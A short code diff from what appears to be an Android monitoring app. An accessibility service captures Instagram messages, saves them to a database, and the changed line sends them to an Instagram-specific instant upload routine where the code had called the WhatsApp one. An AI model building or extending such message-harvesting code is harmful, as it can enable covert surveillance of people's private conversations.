@@ -692,7 +692,7 @@ class BlockAccessibilityService : AccessibilityService() {
                     try {
                         val db = AppDatabase.getInstance(applicationContext)
                         db.instagramMessageDao().insertAll(entriesToInsert)
-                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
+                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                     } catch (e: Exception) {
                         Log.e("BlockA11y", "Failed to insert captured Instagram messages", e)
                     }
